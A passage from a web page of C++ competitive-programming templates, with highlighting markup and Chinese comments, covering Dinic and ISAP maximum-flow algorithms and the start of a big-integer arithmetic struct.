operator">+=</span>f<span class="token punctuation">;</span>                a<span class="token operator">-=</span>f<span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> flow<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">dinic</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> flow<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">BFS</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">memset</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            flow <span class="token operator">+=</span> <span class="token function">DFS</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>inf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> flow<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>DC<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>m<span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        DC<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>m<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> u<span class="token punctuation">,</span>v<span class="token punctuation">,</span>w<span class="token punctuation">;</span>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d%d%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>u<span class="token punctuation">,</span><span class="token operator">&amp;</span>v<span class="token punctuation">,</span><span class="token operator">&amp;</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span>            DC<span class="token punctuation">.</span><span class="token function">AddEdge</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span>v<span class="token punctuation">,</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>DC<span class="token punctuation">.</span><span class="token function">dinic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="18-ISAP"><a href="#18-ISAP" class="headerlink" title="18. ISAP"></a>18. ISAP</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">N</span> <span class="token expression"><span class="token number">1000</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">INF</span> <span class="token expression"><span class="token number">100000000</span></span></span><span class="token keyword">struct</span> <span class="token class-name">Edge</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> from<span class="token punctuation">,</span>to<span class="token punctuation">,</span>cap<span class="token punctuation">,</span>flow<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">ISAP</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">,</span>s<span class="token punctuation">,</span>t<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span>Edge<span class="token operator">></span>edges<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span>G<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">bool</span> vis<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> d<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>cur<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> p<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>num<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//比Dinic算法多了这两个数组，p数组标记父亲结点，num数组标记距离d[i]存在几个</span>    <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        edges<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>         <span class="token punctuation">&#123;</span>             d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> cur<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> p<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">addedge</span><span class="token punctuation">(</span><span class="token keyword">int</span> from<span class="token punctuation">,</span><span class="token keyword">int</span> to<span class="token punctuation">,</span><span class="token keyword">int</span> cap<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        edges<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Edge<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>from<span class="token punctuation">,</span>to<span class="token punctuation">,</span>cap<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        edges<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Edge<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>to<span class="token punctuation">,</span>from<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m<span class="token operator">=</span>edges<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        G<span class="token punctuation">[</span>from<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>m<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        G<span class="token punctuation">[</span>to<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>m<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">Augumemt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> x<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token operator">=</span>INF<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>x<span class="token operator">!=</span>s<span class="token punctuation">)</span><span class="token comment">//找最小的残量值</span>        <span class="token punctuation">&#123;</span>            Edge<span class="token operator">&amp;</span>e<span class="token operator">=</span>edges<span class="token punctuation">[</span>p<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            a<span class="token operator">=</span><span class="token function">min</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>e<span class="token punctuation">.</span>cap<span class="token operator">-</span>e<span class="token punctuation">.</span>flow<span class="token punctuation">)</span><span class="token punctuation">;</span>            x<span class="token operator">=</span>edges<span class="token punctuation">[</span>p<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span>from<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        x<span class="token operator">=</span>t<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>x<span class="token operator">!=</span>s<span class="token punctuation">)</span><span class="token comment">//增广</span>        <span class="token punctuation">&#123;</span>            edges<span class="token punctuation">[</span>p<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flow<span class="token operator">+=</span>a<span class="token punctuation">;</span>            edges<span class="token punctuation">[</span>p<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flow<span class="token operator">-=</span>a<span class="token punctuation">;</span>            x<span class="token operator">=</span>edges<span class="token punctuation">[</span>p<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span>from<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> a<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">bfs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//逆向进行bfs</span>    <span class="token punctuation">&#123;</span>        <span class="token function">memset</span><span class="token punctuation">(</span>vis<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>vis<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span>q<span class="token punctuation">;</span>        q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>        d<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        vis<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> x<span class="token operator">=</span>q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> len<span class="token operator">=</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                Edge<span class="token operator">&amp;</span>e<span class="token operator">=</span>edges<span class="token punctuation">[</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>vis<span class="token punctuation">[</span>e<span class="token punctuation">.</span>from<span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span>e<span class="token punctuation">.</span>cap<span class="token operator">></span>e<span class="token punctuation">.</span>flow<span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    vis<span class="token punctuation">[</span>e<span class="token punctuation">.</span>from<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>                    d<span class="token punctuation">[</span>e<span class="token punctuation">.</span>from<span class="token punctuation">]</span><span class="token operator">=</span>d<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                    q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>from<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">Maxflow</span><span class="token punctuation">(</span><span class="token keyword">int</span> s<span class="token punctuation">,</span><span class="token keyword">int</span> t<span class="token punctuation">)</span><span class="token comment">//根据情况前进或者后退，走到汇点时增广</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token operator">-></span>s<span class="token operator">=</span>s<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token operator">-></span>t<span class="token operator">=</span>t<span class="token punctuation">;</span>        <span class="token keyword">int</span> flow<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">bfs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memset</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            num<span class="token punctuation">[</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> x<span class="token operator">=</span>s<span class="token punctuation">;</span>        <span class="token function">memset</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token operator">&lt;</span>n<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">==</span>t<span class="token punctuation">)</span><span class="token comment">//走到了汇点，进行增广</span>            <span class="token punctuation">&#123;</span>                flow<span class="token operator">+=</span><span class="token function">Augumemt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                x<span class="token operator">=</span>s<span class="token punctuation">;</span><span class="token comment">//增广后回到源点</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">int</span> ok<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>cur<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                Edge<span class="token operator">&amp;</span>e<span class="token operator">=</span>edges<span class="token punctuation">[</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>cap<span class="token operator">></span>e<span class="token punctuation">.</span>flow<span class="token operator">&amp;&amp;</span>d<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">==</span>d<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    ok<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>                    p<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token operator">=</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//记录来的时候走的边，即父边</span>                    cur<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>                    x<span class="token operator">=</span>e<span class="token punctuation">.</span>to<span class="token punctuation">;</span><span class="token comment">//前进</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>ok<span class="token punctuation">)</span><span class="token comment">//走不动了，撤退</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">int</span> m<span class="token operator">=</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//如果没有弧，那么m+1就是n，即d[i]=n</span>                <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    Edge<span class="token operator">&amp;</span>e<span class="token operator">=</span>edges<span class="token punctuation">[</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>cap<span class="token operator">></span>e<span class="token punctuation">.</span>flow<span class="token punctuation">)</span>                        m<span class="token operator">=</span><span class="token function">min</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>d<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">--</span>num<span class="token punctuation">[</span>d<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token comment">//如果走不动了，且这个距离值原来只有一个，那么s-t不连通，这就是所谓的“gap优化”</span>                num<span class="token punctuation">[</span>d<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>                cur<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">!=</span>s<span class="token punctuation">)</span>                    x<span class="token operator">=</span>edges<span class="token punctuation">[</span>p<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span>from<span class="token punctuation">;</span><span class="token comment">//退一步，沿着父边返回</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> flow<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">;</span>    ISAP sap<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cin<span class="token operator">>></span>n<span class="token operator">>></span>m<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        sap<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        sap<span class="token punctuation">.</span>n<span class="token operator">=</span>n<span class="token punctuation">;</span>        sap<span class="token punctuation">.</span>m <span class="token operator">=</span> m<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>sap<span class="token punctuation">.</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> from<span class="token punctuation">,</span>to<span class="token punctuation">,</span>cap<span class="token punctuation">;</span>            cin<span class="token operator">>></span>from<span class="token operator">>></span>to<span class="token operator">>></span>cap<span class="token punctuation">;</span>            sap<span class="token punctuation">.</span><span class="token function">addedge</span><span class="token punctuation">(</span>from<span class="token punctuation">,</span>to<span class="token punctuation">,</span>cap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        cout<span class="token operator">&lt;&lt;</span>sap<span class="token punctuation">.</span><span class="token function">Maxflow</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>sap<span class="token punctuation">.</span>m<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  </code></pre><h3 id="19-大数"><a href="#19-大数" class="headerlink" title="19. 大数"></a>19. 大数</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">bign</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> d<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> len<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>len <span class="token operator">></span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>d<span class="token punctuation">[</span>len<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> len<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token function">bign</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">memset</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">bign</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token operator">*</span><span class="token keyword">this</span> <span class="token operator">=</span> num<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">bign</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> num<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token operator">*</span><span class="token keyword">this</span> <span class="token operator">=</span> num<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    bign <span class="token keyword">operator</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> num<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">memset</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> num<span class="token punctuation">[</span>len<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'0'</span><span class="token punctuation">;</span>        <span class="token function">clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    bign <span class="token keyword">operator</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"%d"</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token keyword">this</span> <span class="token operator">=</span> s<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    bign <span class="token keyword">operator</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        bign c <span class="token operator">=</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> b<span class="token punctuation">.</span>len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> b<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">9</span><span class="token punctuation">)</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">%=</span><span class="token number">10</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">9</span><span class="token punctuation">)</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">%=</span><span class="token number">10</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">++</span><span class="token 